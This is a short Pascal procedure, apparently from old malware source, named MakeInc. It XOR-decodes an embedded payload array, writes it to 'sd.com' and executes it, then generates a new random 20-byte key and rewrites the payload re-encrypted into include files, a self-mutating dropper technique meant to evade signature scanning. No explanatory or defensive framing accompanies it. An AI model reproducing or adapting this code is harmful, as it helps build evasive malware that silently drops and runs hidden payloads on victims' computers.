   procedure MakeInc;
   var d:file;
       i,j:integer;
       t,k:text;
       Dropper:array[1..DropLen] of byte;
   begin
   j:=1;
   for i:=1 to DropLen do
     begin
     Dropper[i]:=dr[i] xor OldKey[j];
     if j=20 then j:=1 else inc(j);
     end;
   assign(d,'sd.com');rewrite(d,DropLen);
   blockwrite(d,Dropper,1);
   close(d);
   exec('sd.com','');
   assign(k,'sk.inc');
   rewrite(k);
   for i:=1 to 19 do
     begin
     NewKey[i]:=random(256);
     write(k,NewKey[i],',');
     end;
   NewKey[20]:=random(256);
   write(k,NewKey[20]);
   close(k);
   assign(t,'sd.inc');
   rewrite(t);
   j:=1;
   write(t,'(');
   for i:=1 to DropLen do
     begin
     write(t,Dropper[i] xor NewKey[j]);
     if i<>DropLen then write(t,',');
     if j=20 then begin writeln(t,'');j:=1;end else inc(j);
     end;
   write(t,')');
   close(t);
   end;
